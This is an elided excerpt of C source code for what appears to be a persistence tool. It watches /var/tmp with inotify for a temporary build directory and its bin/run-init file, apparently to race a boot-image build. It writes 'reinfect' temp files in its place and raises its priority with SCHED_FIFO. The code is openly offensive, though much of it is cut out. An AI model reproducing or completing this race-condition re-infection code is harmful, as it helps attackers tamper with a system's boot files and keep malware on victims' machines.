...
static int make_tempfile(char *basedir, mode_t mode){
	...
	do {
		...
		fclose(urandom);
		snprintf(filename, sizeof(filename) - 1, "%s/reinfect-%X", basedir, rand);
...
static int add_watch(const char *template, char *name, int mask){
	...
	rc = inotify_add_watch(ctx.inotify_fd,filename, mask);
	if (rc < 0) {
		char buf[256];
...
static void handle_inotify_event(const struct inotify_event *event){
	if ((event->mask & IN_CREATE) && (event->len)) {
		...
		if ((event->wd == ctx.tmpdir_wd) && (event->mask & IN_ISDIR) && !strncmp(event->name, template, sizeof(template) - 1)) {
			...
			ctx.bin_wd = rc;
			snprintf(ctx.tmpdir, sizeof(ctx.tmpdir) - 1,"/var/tmp/%s", name);
			strcpy(ctx.tmpfile, "/var/tmp");
			rc = make_tempfile(ctx.tmpfile, S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
			if (rc < 0) {
				perror("mkstmp");
				exit(EXIT_FAILURE);
			}
		...
		} else if ((event->wd == ctx.bin_wd) && (event->mask & IN_ISDIR) && !strcmp(event->name, "bin")) {
			ctx.bin_create_wd = add_watch("%s/bin", ctx.tmpdir, IN_CREATE);
		} else if ((event->wd == ctx.bin_create_wd) && !(event->mask & IN_ISDIR) && !strcmp(event->name, "run-init")) {
			snprintf(ctx.run_init_path, sizeof(ctx.run_init_path) - 1, "%s/bin/run-init", ctx.tmpdir);
			ctx.run_init_wd = add_watch("%s/bin/run-init", ctx.tmpdir, IN_CLOSE);
		}
	} else if ((event->wd == ctx.run_init_wd) && (event->mask & IN_CLOSE_WRITE)){
...
pid_t run_reinfect(){
	...
	if (pid < 0){
		...
		rc = sched_setscheduler(getpid(), SCHED_FIFO, &sched);
		if (rc < 0) {
